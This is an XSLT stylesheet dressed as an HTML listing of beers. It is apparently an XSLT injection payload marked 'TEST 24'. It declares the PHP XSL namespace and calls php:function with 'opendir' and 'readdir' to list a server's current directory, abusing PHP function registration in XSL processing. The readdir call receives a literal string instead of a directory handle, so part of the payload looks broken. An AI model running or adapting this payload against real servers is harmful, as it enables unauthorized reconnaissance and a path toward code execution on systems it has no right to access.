<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
<xsl:for-each select="beers/beer">
  <div style="background-color:teal;color:white;padding:4px">
    <span style="font-weight:bold">
    <xsl:variable name="fd" select="php:function('opendir','.')" />
    <xsl:value-of select="$fd"/>
    <xsl:value-of select="php:function('readdir','opendir(`.`)')"/> - </span>
  </div>
  <div style="margin-left:20px;margin-bottom:1em;font-size:10pt">
    <p>
    TEST 24 
    <span style="font-style:italic"> (<xsl:value-of select='prct'/> %) </span>
    </p>
  </div>
</xsl:for-each>
</body>
</html> 

